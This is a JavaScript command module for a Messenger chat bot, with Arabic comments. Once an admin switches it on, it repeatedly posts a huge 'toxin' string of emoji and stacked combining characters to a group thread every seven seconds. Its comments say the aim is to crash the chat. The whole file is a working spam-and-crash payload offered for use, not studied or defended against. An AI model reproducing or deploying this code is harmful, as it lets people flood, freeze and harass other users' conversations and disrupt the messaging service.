const fs = require("fs-extra");
const path = require("path");

if (!global.zypherSniper) global.zypherSniper = {};

module.exports = {
  config: {
    name: "زيفࢪ",
    aliases: ["zypher"],
    version: "7.0.0",
    author: "Hanji",
    role: 2,
    shortDescription: "نظام زيفࢪ للدمار الصامت بـ الـ Payload",
    category: "SYSTEM",
    guide: { en: ".زيفࢪ on | .زيفࢪ off" }
  },

  onStart: async function ({ api, event, args }) {
    const { threadID, senderID, messageID } = event;
    const adminBot = global.GoatBot?.config?.adminBot || [];
    
    if (!adminBot.includes(senderID.toString())) return;

    const mode = args[0]?.toLowerCase();
    const cachePath = path.join(__dirname, "cache", "payload.txt");

    // تحديث النص المسموم فـ الكاش (بناءً على طلبك)
    const toxin = "🏴‍☠️🥷🏾👨‍👩‍👧‍👦҉͏҈͎̺̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻";
    const payloadContent = toxin.repeat(50); // تكرار 50 مرة باش يفركع الشات
    fs.writeFileSync(cachePath, payloadContent);

    // --- [ وضعية الإيقاف OFF ] ---
    if (mode === "off") {
        if (global.zypherSniper[threadID]) {
            global.zypherSniper[threadID].active = false;
            delete global.zypherSniper[threadID];
            return api.setMessageReaction("⏹️", messageID, () => {}, true);
        }
    }

    // --- [ وضعية التشغيل ON ] ---
    if (mode === "on") {
        if (global.zypherSniper[threadID]?.active) return;

        global.zypherSniper[threadID] = { active: true };
        api.setMessageReaction("🚀", messageID, () => {}, true);

        const startExecution = async () => {
            if (!global.zypherSniper[threadID] || !global.zypherSniper[threadID].active) return;

            try {
                const payload = fs.readFileSync(cachePath, "utf-8");
                await api.sendMessage(payload, threadID);

                // ⏳ 7 ثواني بين كل صاعقة
                setTimeout(startExecution, 7000);

            } catch (e) {
                console.error("Sniper Error:", e);
                delete global.zypherSniper[threadID];
            }
        };

        startExecution();
    }
  }
};
